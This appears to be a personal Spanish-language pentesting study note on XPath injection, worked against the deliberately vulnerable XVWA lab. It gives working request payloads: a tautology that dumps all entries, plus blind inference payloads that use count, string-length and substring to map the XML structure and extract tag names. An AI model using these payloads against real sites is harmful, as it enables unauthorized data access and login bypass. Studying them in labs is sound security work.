> Similar to SQL Injection, XPath Injection attacks occur when a web site uses user-supplied information to construct an XPath query for XML data. By sending intentionally malformed information into the web site, an attacker can find out how the XML data is structured, or access data that they may not normally have access to. They may even be able to elevate their privileges on the web site if the XML data is being used for authentication (such as an XML based user file).

## Laboratorio
- [[vulnhub]] - Xtreme Vulnerable Web Application

## Recurso web
- [Link](https://gitee.com/scriptkiddies/hacktricks/blob/master/pentesting-web/xpath-injection.md)
## Ataques

### Cantidad de etiquetas
- Dentro de la `ip/xvwa/xpath` hay un buscador que es vulnerable a este tipo de inyecciones
- En la busqueda podemos agregar el payload:
```
search=' or '1'='1&submit=
```
- Similar sqli estoy forzando a que me muestre todos los elementos sin filtrar por un valor
```
search=1' and count(/*)='1&submit=
```
- Aca aplicamos un blind xpath porque inferimos el resultado segun la respuesta. Como existe un elemento que es 1 lo cerramos con comilla `1'` luego concatenamos algo que si es verdadero me muestra el elemento 1. Por ultimo hacemos un conteo de los elementos que estan en la raiz y si es igual a 1 devolvera el elemento 1.
- Esto se puede encadenar con mas elementos. Por ejemplo para armar el arbol de xml y descubrir cuantas etiquetas hay dentro de la raiz
```
search=1' and count(/*[1]/*)='10&submit=
```
- Le estoy diciendo del primer elemento que encontre antes hay 10 etiquetas dentro? Si es correcto me devuelve el elemento 1.
- Si quiero volver a buscar dentro de la raiz y su vez en la primer etiqueta cuantas subetiquetas hay:
```
search=1' and count(/*[1]/*[1]/*)='4&submit=
```

### Longitud de la etiqueta
```
search=1' and string-length(name(/*[1]))='7&submit=
```
- Con la funcion `string-length` puedo preguntar que longitud tiene un nombre de etiqueta
- Y asi replicariamos para elementos dentro de esa etiqueta
```
search=1' and string-length(name(/*[1]/*[1]))='6&submit=
```

### Conocer el nombre de la etiqueta
- Para ello debemos inferir caracter por caracter y basarnos en la repuesta nuevamente
```
search=1' and substring(name(/*[1]),1,1)='C&submit=
```
- La funcion `substring` recibe el nombre de la etiqueta `name(/*[1])`, luego la posicion del caracter `1` y por ultimo la posicion de la palabra `1`.


## Automatizar
- Descubriendo cantidad de etiquetas
- Descubriendo cantidad de letras en una etiqueta
- Descubriendo el nombre de la etiqueta